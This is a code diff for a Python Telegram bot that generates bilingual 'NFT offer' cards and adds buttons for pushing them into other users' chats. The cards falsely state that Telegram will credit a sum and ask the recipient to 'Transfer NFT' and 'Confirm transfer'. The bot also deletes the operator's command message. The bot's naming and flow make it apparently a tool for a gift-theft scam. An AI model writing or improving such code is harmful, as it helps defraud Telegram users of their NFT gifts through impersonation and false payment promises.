@@ -21,6 +21,7 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 active_deals = {}
+BOT_USERNAME = "work_vllw_bot"  # запасное значение, обновится при старте
 
 
 # ================= ТЕКСТЫ =================
@@ -68,15 +69,13 @@ TEXTS = {
         "deal_done": "✅ Сделка завершена. Средства зачислены на ваш баланс.",
         "inline_title": "NFT предложение",
         "inline_desc": "Нажмите чтобы отправить карточку",
-        # Сообщения для команды .send
-        "send_ready": (
-            "✅ <b>Карточка готова!</b>\n\n"
-            "Нажмите кнопку ниже → выберите чат → карточка отправится автоматически."
-        ),
+        "send_ready": "✅ <b>Карточка готова!</b>\n\nВыберите, как отправить её собеседнику:",
         "send_btn": "📤 Отправить в чат",
-        "send_usage": (
-            "⚠️ Использование: `.send <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
-            "Пример: `.send https://t.me/nft/SnoopDogg-9203 1000 STARS`"
+        "copy_btn": "📋 Показать inline-запрос",
+        "copy_hint": (
+            "Скопируйте и вставьте в нужный чат:\n\n"
+            "<code>@{bot} {query}</code>\n\n"
+            "Затем тапните по появившейся карточке."
         ),
     },
     "en": {
@@ -105,31 +104,34 @@ TEXTS = {
         "step2_prefix": "2. Click «Transfer NFT» and choose",
         "step3": "3. Confirm transfer.",
         "link_to_gift": "Gift link",
-        "final_note": (
-            "Telegram will credit {amount} {currency}. Reservation valid 24h."
-        ),
+        "final_note": "Telegram will credit {amount} {currency}. Reservation valid 24h.",
         "transfer_btn": "Transfer NFT",
         "confirm_btn": "Confirm transfer",
         "confirmed": "✅ Transaction confirmed!",
         "deal_done": "✅ Deal completed.",
         "inline_title": "NFT offer",
         "inline_desc": "Tap to send the card",
-        "send_ready": (
-            "✅ <b>Card is ready!</b>\n\n"
-            "Tap the button below → choose a chat → the card will be sent."
-        ),
+        "send_ready": "✅ <b>Card is ready!</b>\n\nChoose how to send it:",
         "send_btn": "📤 Send to chat",
-        "send_usage": (
-            "⚠️ Usage: `.send <NFT_link> <amount> <currency> [eu]`\n"
-            "Example: `.send https://t.me/nft/SnoopDogg-9203 1000 STARS`"
+        "copy_btn": "📋 Show inline query",
+        "copy_hint": (
+            "Copy and paste into the chat:\n\n"
+            "<code>@{bot} {query}</code>\n\n"
+            "Then tap the card."
         ),
     },
 }
 
 
+# ================= ПАРСИНГ =================
 def parse_nft_link(url):
+    # Очищаем от невидимых символов
+    url = (url or "").strip()
+    for ch in ("\u00a0", "\u200b", "\u200f", "\u200e"):
+        url = url.replace(ch, "")
     match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
     if not match:
+        logging.warning(f"Не удалось распарсить ссылку: {url!r}")
         return None
     name = match.group(1)
     number = match.group(2)
@@ -137,20 +139,21 @@ def parse_nft_link(url):
 
 
 def parse_buy_args(text):
-    """Разбирает аргументы: и с 'buy', и без."""
     args = text.split()
     lang = "ru"
     if len(args) >= 2 and args[-1].lower() == "eu":
         lang = "en"
         args = args[:-1]
-    # Убираем первое слово, если это buy / /buy / .buy
-    if args and args[0].lower().lstrip("/.") == "buy":
-        args = args[1:]
+    if args:
+        first = args[0].lower().lstrip("/.")
+        if first in ("buy", "send"):
+            args = args[1:]
     if len(args) < 3:
         return None
     return lang, args[0], args[1], args[2].upper()
 
 
+# ================= СБОРКА ТЕКСТОВ =================
 def build_offer_text(t, nft_title, amount, currency, nft_link):
     return (
         f"<b>{t['header']}</b>\n"
@@ -204,21 +207,21 @@ def build_final_keyboard(t, deal, chat_id, user_id, lang):
     return builder
 
 
-# ================= КОМАНДА .send / .buy =================
+# ================= КОМАНДА .send / .buy / /send / /buy =================
 @dp.message(Command("send"))
 @dp.message(Command("buy"))
 @dp.message(F.text.startswith(".send"))
 @dp.message(F.text.startswith(".buy"))
 async def cmd_send_handler(message: types.Message):
-    # Удаляем сообщение пользователя
-    try:
-        await message.delete()
-    except Exception as e:
-        logging.warning(f"Не удалось удалить сообщение: {e}")
+    logging.info(f"[CMD] text={message.text!r}")
 
     parsed = parse_buy_args(message.text)
     if not parsed:
-        await message.answer(TEXTS["ru"]["send_usage"])
+        await message.answer(TEXTS["ru"]["usage"])
+        try:
+            await message.delete()
+        except Exception:
+            pass
         return
 
     lang, nft_link, amount, currency = parsed
@@ -227,77 +230,63 @@ async def cmd_send_handler(message: types.Message):
     nft_data = parse_nft_link(nft_link)
     if not nft_data:
         await message.answer(t["invalid_link"])
+        try:
+            await message.delete()
+        except Exception:
+            pass
         return
 
     nft_title = nft_data["full"]
+    username = BOT_USERNAME or "work_vllw_bot"
 
-    # Формируем ссылку для кнопки "Поделиться"
-    # Формат: https://t.me/share/url?url=<текст>&text=<заголовок>
-    # Но так как карточка с кнопками должна идти в чат — используем
-    # inline-ссылку на этого же бота с параметром query.
-    share_query = f"{nft_link} {amount} {currency}"
-    if lang == "en":
-        share_query += " eu"
-
-    # Ссылка на inline-запрос нашего бота с готовой строкой
-    inline_link = f"https://t.me/{bot.username}?start=inline_{share_query}"
-
-    # Но проще использовать t.me/share/url — Telegram откроет список чатов
-    # и предложит отправить текст. Однако карточку с кнопками так не отправить.
-    # Поэтому даём кнопку-ссылку на самого бота с параметром, которая при нажатии
-    # открывает inline-режим с готовыми данными.
-
-    # Ссылка-подсказка для пользователя: открыть чат, вставить запрос
-    share_text = f"@{bot.username} {share_query}"
-
+    # Формируем кнопки
     builder = InlineKeyboardBuilder()
     builder.row(
         InlineKeyboardButton(
             text=t["send_btn"],
-            url=f"https://t.me/share/url?url={nft_link}&text={amount}%20{currency}"
+            url=f"https://t.me/share/url?url={nft_link}&text={amount}%20{currency}",
         )
     )
     builder.row(
         InlineKeyboardButton(
-            text="📋 Скопировать inline-запрос",
-            callback_data=f"copy_{message.from_user.id}_{nft_link}_{amount}_{currency}_{lang}"
+            text=t["copy_btn"],
+            callback_data=f"copydata|{message.from_user.id}|{nft_link}|{amount}|{currency}|{lang}",
         )
     )
 
-    # Готовим "инструкцию" и кнопку
-    await message.answer(
-        text=(
-            f"{t['send_ready']}\n\n"
-            f"<code>{share_text}</code>\n\n"
-            f"<i>1. Нажмите кнопку ниже\n"
-            f"2. Выберите чат с собеседником\n"
-            f"3. Если Telegram не отправит карточку — вернитесь в чат, "
-            f"введите <code>@work_vvl_bot {nft_link} {amount} {currency}</code> "
-            f"и тапните по появившейся карточке.</i>"
-        ),
-        reply_markup=builder.as_markup(),
-        parse_mode="HTML",
-        disable_web_page_preview=True,
-    )
-
-
-# Кнопка "скопировать inline-запрос"
-@dp.callback_query(F.data.startswith("copy_"))
-async def process_copy(callback: CallbackQuery):
-    parts = callback.data.split("_")
-    # copy_<user_id>_<link>_<amount>_<currency>_<lang>
-    # link содержит /, поэтому разбираем аккуратно
-    # Простой подход: user_id и lang — по краям, остальное — link/amount/currency
     try:
-        user_id = parts[1]
-        lang = parts[-1]
-        currency = parts[-2]
-        amount = parts[-3]
-        # link — всё между user_id и amount (склеиваем)
-        nft_link = "_".join(parts[2:-3])
-    except Exception:
+        await message.answer(
+            text=(
+                f"{t['send_ready']}\n\n"
+                f"<b>Вариант 1 — быстро:</b>\n"
+                f"Нажмите <b>{t['send_btn']}</b> → выберите чат → отправьте.\n\n"
+                f"<b>Вариант 2 — с кнопками:</b>\n"
+                f"Нажмите <b>{t['copy_btn']}</b> → скопируйте запрос → вставьте в чат с собеседником → тапните по карточке."
+            ),
+            reply_markup=builder.as_markup(),
+            parse_mode="HTML",
+            disable_web_page_preview=True,
+        )
+    except Exception as e:
+        logging.error(f"Ошибка отправки ответа: {e}")
+        await message.answer(f"⚠️ Ошибка: {e}")
+        return
+
+    try:
+        await message.delete()
+    except Exception as e:
+        logging.warning(f"Не удалось удалить сообщение: {e}")
+
+
+# ================= Показать inline-запрос =================
+@dp.callback_query(F.data.startswith("copydata|"))
+async def process_copy(callback: CallbackQuery):
+    parts = callback.data.split("|")
+    if len(parts) != 6:
         await callback.answer("Ошибка", show_alert=True)
         return
+
+    _, user_id, nft_link, amount, currency, lang = parts
 
     if str(callback.from_user.id) != user_id:
         await callback.answer("Не для вас", show_alert=True)
@@ -307,12 +296,12 @@ async def process_copy(callback: CallbackQuery):
     if lang == "en":
         query += " eu"
 
-    # Отправляем сообщение с inline-запросом в виде кода (для копирования)
-    await callback.message.answer(
-        f"Скопируйте и вставьте в чат:\n\n<code>@{bot.username} {query}</code>",
-        parse_mode="HTML",
-    )
-    await callback.answer("Скопировано в чат")
+    t = TEXTS[lang]
+    username = BOT_USERNAME or "work_vllw_bot"
+    text = t["copy_hint"].format(bot=username, query=query)
+
+    await callback.message.answer(text=text, parse_mode="HTML")
+    await callback.answer("Готово")
 
 
 # ================= INLINE MODE =================
@@ -326,9 +315,7 @@ async def inline_query_handler(query: InlineQuery):
             id="usage",
             title="Использование",
             description="Ссылка + сумма + валюта",
-            input_message_content=InputTextMessageContent(
-                message_text=t["usage"]
-            ),
+            input_message_content=InputTextMessageContent(message_text=t["usage"]),
         )
         await query.answer(results=[result], cache_time=1)
         return
@@ -340,9 +327,7 @@ async def inline_query_handler(query: InlineQuery):
             id="usage",
             title="⚠️ Неверный формат",
             description="Пример: https://t.me/nft/SnoopDogg-9203 1000 STARS",
-            input_message_content=InputTextMessageContent(
-                message_text=t["usage"]
-            ),
+            input_message_content=InputTextMessageContent(message_text=t["usage"]),
         )
         await query.answer(results=[result], cache_time=1)
         return
@@ -356,15 +341,12 @@ async def inline_query_handler(query: InlineQuery):
             id="bad_link",
             title="⚠️ Неверная ссылка",
             description="Пример: https://t.me/nft/SnoopDogg-9203",
-            input_message_content=InputTextMessageContent(
-                message_text=t["invalid_link"]
-            ),
+            input_message_content=InputTextMessageContent(message_text=t["invalid_link"]),
         )
         await query.answer(results=[result], cache_time=1)
         return
 
     nft_title = nft_data["full"]
-
     chat_id = query.from_user.id
     user_id = query.from_user.id
 
@@ -379,7 +361,7 @@ async def inline_query_handler(query: InlineQuery):
         "chat_id": chat_id,
     }
 
-    text = build_offer_text(t, nft_title, amount, currency, nft_link)
+    text_msg = build_offer_text(t, nft_title, amount, currency, nft_link)
     builder = build_offer_keyboard(t, chat_id, user_id, lang)
 
     result = InlineQueryResultArticle(
@@ -387,7 +369,7 @@ async def inline_query_handler(query: InlineQuery):
         title=f"{t['inline_title']}: {nft_title}",
         description=f"{amount} {currency} — {t['inline_desc']}",
         input_message_content=InputTextMessageContent(
-            message_text=text,
+            message_text=text_msg,
             parse_mode="HTML",
         ),
         reply_markup=builder.as_markup(),
@@ -477,8 +459,14 @@ async def handle(request):
 
 
 async def main():
+    global BOT_USERNAME
     logging.info("=== MAIN STARTED ===")
     port = int(os.environ.get("PORT", 10000))
+
+    me = await bot.get_me()
+    BOT_USERNAME = me.username
+    logging.info(f"Bot username: {BOT_USERNAME}")
+
     app = web.Application()
     app.router.add_get("/", handle)
     runner = web.AppRunner(app)
